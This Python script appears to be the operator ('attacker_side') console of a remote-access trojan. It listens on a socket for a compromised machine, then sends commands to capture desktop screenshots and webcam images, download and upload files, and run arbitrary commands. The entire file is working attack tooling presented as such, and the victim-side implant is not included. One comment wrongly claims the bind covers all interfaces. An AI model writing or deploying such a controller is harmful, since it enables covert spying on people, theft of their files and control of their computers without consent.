import socket
import os

def receive_file(connection, file_path):
    try:
        file_size = int(connection.recv(1024).decode().strip())
        
        with open(file_path, 'wb') as f:
            bytes_received = 0
            while bytes_received < file_size:
                chunk = connection.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)
    except Exception as e:
        print(f"Error receiving file: {e}")

def send_file(connection, file_path):
    try:
        file_size = os.path.getsize(file_path)
        connection.sendall(str(file_size).encode() + b'\n')
        
        with open(file_path, 'rb') as f:
            while True:
                bytes_read = f.read(1024)
                if not bytes_read:
                    break
                connection.sendall(bytes_read)
    except Exception as e:
        print(f"Error sending file: {e}")

def attacker_side():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('192.168.18.10', 8080))  # Bind to all available network interfaces
    sock.listen(1)
    print("Waiting for connection...")
    connection, address = sock.accept()
    print(f"Connected by {address}")

    while True:
        command = input("> ")
        connection.send(command.encode())
        if command == 'exit':
            break
        elif command == 'desktop':
            receive_file(connection, 'screenshot.jpg')
            print("Desktop screenshot saved to screenshot.jpg")
        elif command == 'camera':
            receive_file(connection, 'camera.jpg')
            print("Camera image saved to camera.jpg")
        elif command.startswith('download'):
            _, file_path = command.split()
            receive_file(connection, file_path)
            print(f"File {file_path} downloaded.")
        elif command.startswith('upload'):
            _, file_path = command.split()
            send_file(connection, file_path)
            print(f"File {file_path} uploaded.")
        else:
            output = connection.recv(1024)
            print(output.decode())

    connection.close()

attacker_side()
